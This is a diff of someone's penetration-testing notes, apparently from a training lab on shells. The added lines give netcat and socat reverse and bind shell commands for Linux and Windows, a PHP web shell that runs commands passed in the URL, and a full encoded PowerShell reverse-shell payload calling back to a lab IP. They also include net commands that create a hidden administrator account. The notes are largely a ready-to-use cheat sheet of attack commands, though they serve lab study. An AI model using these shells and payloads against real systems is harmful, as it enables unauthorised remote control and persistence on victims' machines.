@@ -877,11 +877,13 @@ How to choose version:
 
 **Types of Shell**
 Reverse shell.
+- attacker listen.
 - Reverse shells. need to configure your own network to accept the shell.
 - attack: ``` sudo nc -lvnp 443 ```
 - target: ``` nc <ATTACKER-IP> <PORT> -e /bin/bash ```
 
 Bind shell.
+- target listen.
 - Bind shells. start a listener attached to a shell directly on the target.may be prevented by firewalls protecting the target.
 - target: ``` nc -lvnp <port> -e "cmd.exe" ```
 - attacker: ``` nc <TARGET_IP> <port> ```
@@ -1035,20 +1037,46 @@ p3(nc BIND SHELL)
 - ``` nc  -lvnp 4444-e /bin/bash ``` target’s terminal
 - ``` nc <target-ip> 4444 ``` attacker’s terminal
 
-p4(socat reverse shell)
+p4(socat reverse shell linux)
 - ``` socat TCP-L:4444 - ``` attacker`s
 - ``` socat TCP:<tun0-ip>:4444 EXEC:"bash -li" ``` target`s
 
-p4(socat bind shell)
+p4(socat bind shell linux)
 - ``` socat TCP-L:4444 EXEC:"bash -li" ``` target`s
 - ``` socat TCP:<ip>:4444 - ``` attacker`s
 
-p5
-- can not submit linux reverse shell to windows
+P5 other reverse shell techniques
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
 p6
-- windows php reverse shell
+- can not submit linux reverse shell to windows
+
+p7 windows php reverse shell
 - ```  <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> ```
 - visit usl ``` http://10.10.90.47/uploads/shell.php?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient(%2710.9.135.33%27%2C1337)%3B%24stream%20%3D%20%24client.GetStream()%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile((%24i%20%3D%20%24stream.Read(%24bytes%2C%200%2C%20%24bytes.Length))%20-ne%200)%7B%3B%24data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString(%24bytes%2C0%2C%20%24i)%3B%24sendback%20%3D%20(iex%20%24data%202%3E%261%20%7C%20Out-String%20)%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20(pwd).Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20(%5Btext.encoding%5D%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()%7D%3B%24client.Close()%22%0A ```
 - which after url decode is ``` http://10.10.90.47/uploads/shell.php?cmd=powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.9.135.33',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"  ```
 
+P8 Windows net command.
+- The "Net Accounts" command is used to set the policy settings on local computer, such as Account policies and password policies. This command can't be used on domain controller. This command is only used on local computer.
+- add a user and add to administrators group.
+- ``` net user USERNAME PASSWORD /ad ```
+- ``` net localgroup administrators USERNAME /add ```
+
+p9 (nc reverse shell windows)
+- ``` nc -lvnp 4444 ``` attacker`s
+- ``` nc <tun0-ip> 4444 -e "cmd.exe" ``` target`s
+
+p9 (nc bind shell windows)
+- ``` nc -lvnp 3333 -e "cmd.exe" ``` target`s
+- ``` nc <target-ip>  3333 ``` attacker`s
+
+p9 (socat reverse shell windows)
+- ``` socat TCP-L:8888 - ``` attacker`s
+- ``` socat TCP:<tun0-ip>:8888 EXEC:powershell.exe,pipes ``` target`s
+
+p9 (socat bind shell windows)
+- ``` socat TCP-L:4444EXEC:powershell.exe,pipes ``` target`s
+- ``` socat TCP:<target-ip>:4444- ``` attacker`s
+
+p10
+- 
